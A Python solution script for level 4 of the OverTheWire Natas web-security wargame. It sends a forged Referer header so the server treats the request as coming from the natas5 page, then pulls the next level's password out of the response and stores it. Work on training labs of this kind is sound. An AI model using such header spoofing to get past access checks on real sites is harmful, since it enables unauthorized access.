"""
natas4: HTTP referer header, lying to the server
"""

import re
import requests
from bs4 import BeautifulSoup
from typing import Optional

from natas_utils import *

LEVEL = 4

def solve(url: str, login: LevelLogin) -> Optional[str]:
    # recon indicates that 'authorized users should come only from "http://natas5.natas.labs.overthewire.org/"'
    # solution: set custom referer header

    # trailing '/' is needed for a string match
    natas5_url = NATAS_DATA["level_url_format"].format(5) + '/'
    response = requests.get(url, auth=login, headers={"Referer": natas5_url})
    # print(response.text)

    soup = BeautifulSoup(response.text, "html.parser")

    # overkill, since there's only one password in the page
    candidate_passwords = re.findall(PW_FORMAT, soup.find("div", attrs={"id": "content"}).text)
    natas5_password = try_level_login(LEVEL + 1, candidate_passwords)

    return natas5_password

if __name__ == "__main__":
    url, login = load_level(LEVEL)
    natas5_password = solve(url, login)

    if natas5_password:
        print("natas5:", natas5_password)
        store_level_password(LEVEL + 1, natas5_password)